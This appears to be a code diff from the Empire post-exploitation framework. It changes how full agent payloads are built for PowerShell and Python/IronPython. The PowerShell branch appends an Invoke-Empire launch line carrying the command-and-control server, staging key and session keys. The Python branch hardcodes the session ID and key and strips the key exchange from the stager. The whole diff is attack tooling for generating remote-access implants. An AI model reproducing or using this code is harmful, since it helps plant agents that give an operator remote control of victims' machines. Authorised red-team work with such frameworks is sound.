@@ -778,9 +778,6 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
             # get the agent's session key
             session_key = agent.session_key
 
-            if language.lower() in ["python", "ironpython"]:
-                session_key = bytes.fromhex(session_key)
-
             agent_code = active_listener.generate_agent(
                 active_listener.options, language=language, version=version
             )
@@ -788,10 +785,28 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
                 active_listener.options, language=language
             )
 
-            launch_code = (
-                "\nInvoke-Empire -Servers @('%s') -StagingKey '%s' -SessionKey '%s' -SessionID '%s';"
-                % (host, staging_key, session_key, session_id)
+            stager_code = active_listener.generate_stager(
+                active_listener.options, language=language, encrypt=False, encode=False
             )
 
-            full_agent = comms_code + agent_code + launch_code
-            return full_agent
+            if options["Language"]["Value"] == "powershell":
+                launch_code = (
+                    "\nInvoke-Empire -Servers @('%s') -StagingKey '%s' -SessionKey '%s' -SessionID '%s';"
+                    % (host, staging_key, session_key, session_id)
+                )
+                full_agent = comms_code + "\n" + agent_code + "\n" + launch_code
+                return full_agent
+
+            elif options["Language"]["Value"] in ["python", "ironpython"]:
+                stager_code = stager_code.replace(
+                    "b''.join(random.choice(string.ascii_uppercase + string.digits).encode('UTF-8') for _ in range(8))",
+                    f"b'{session_id}'",
+                )
+                stager_code = stager_code.split("clientPub=DiffieHellman()")[0]
+                stager_code = stager_code + f"\nkey = b'{session_key}'"
+                launch_code = ""
+
+                full_agent = "\n".join(
+                    [stager_code, comms_code, agent_code, launch_code]
+                )
+                return full_agent
